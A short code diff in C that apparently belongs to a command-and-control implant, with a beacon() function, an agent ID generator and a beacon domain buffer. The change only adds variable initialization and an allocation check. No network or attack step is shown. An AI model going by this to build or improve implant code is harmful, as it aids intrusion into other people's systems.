@@ -69,13 +69,16 @@ unsigned int genagentid() {
 }
 
 void beacon(LPVOID lpReserved) {
-	char * buffer;
-	int    length;
+	char * buffer = NULL;
+	int    length = 0;
 	unsigned int adjust = 0;
 
 	/* 一些元数据 */
-	datap * blob          = data_alloc(256 + 128);  /* blob被跟踪 */
-	char  * url           = data_ptr(blob, 256);
+	datap * blob = data_alloc(256 + 128);
+	if (blob == NULL) {
+		safe_exit();
+	}
+	char  * url = data_ptr(blob, 256);
 	char  * beacon_domain = data_ptr(blob, 128);
 	int len = 128, ll = 1024;
 	unsigned int signal;
